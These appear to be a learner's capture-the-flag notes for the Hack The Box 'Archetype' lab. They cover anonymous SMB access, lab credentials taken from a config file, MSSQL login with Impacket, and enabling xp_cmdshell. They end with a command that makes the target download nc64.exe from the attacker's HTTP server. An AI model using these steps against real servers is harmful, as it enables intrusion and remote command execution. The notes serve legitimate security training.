[[HTB-LABS]] [[Week4]]

# **Archetype**
this what i learn:
1. you can enter `smb` server by `smbclient` , and you can use those flages: `-N` mean **no password** . and can use `-L` to **List service or directory**
2. after we do this , there's some dir show and one of those is `backups` and to enter it
   we can use this command `smbclient -N \\\\{IP}\\backups` by this we will get shell and can use `dir` command to list what in there , then use `get` to download
3. when use `dir` you will find find file its name is `prod.dtsConfig`  and use get to download this file , then if you cat this file you will see code , in this code you will see username `ARCHETYPE\sql_svc` password `M3g4c0rp123` . this is the code 
```
   <DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>

```
4. we will use Impacket ```
```
Impacket is a collection of Python classes for working with network protocols. Impacket is focused on providing low-level programmatic access to the packets and for some protocols (e.g. SMB1-3 and MSRPC) the protocol implementation itself. Packets can be constructed from scratch, as well as parsed from raw data, and the object oriented API makes it simple to work with deep hierarchies of protocols. The library provides a set of tools as examples of what can be done within the context of this library.
```

5. we will use this script `mssqlclient.py` with this flaags `-windows-auth` :this flag is specified to use Windows Authentication .
   `python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth` by then the password and by that you'r connect to sql server and type `help` for help 
   Here's a great article that can guide us further to our exploration journey with MSSQL Server:
   https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet

6. and from this cheat-sheet i will use this `SELECT is_srvrolemember('sysadmin');` continue using the cheat-sheet to see , from the command above the result is 1 and that mean it `true` which mean i'm admin or `sysadmin` .
7. after you know you'r admin use this script to enable shell
 ```
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure; - Enabling the sp_configure as stated in the above error message
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```
8.  now we will use this file [ne64.exe](https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------) , but first we need to run Power-Shell because it better than normal command prompt , to do this we will use this command `xp_cmdshell "powershell -c command"`  replace `commnad` with any command you want to perform , i use `pwd` to know where we are , and this is the output `C:\Windows\system32` but we cannot write here , so after some enumeration i know that download will be great 
9. now we need to upload this  [ne64.exe](https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------) file , and for that we will use this 
   command `sudo python3 -m http.server 80` in our terminal , now in the server terminal do this command  `xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads;wgethttp://10.10.14.9/nc64.exe -outfile nc64.exe"` 

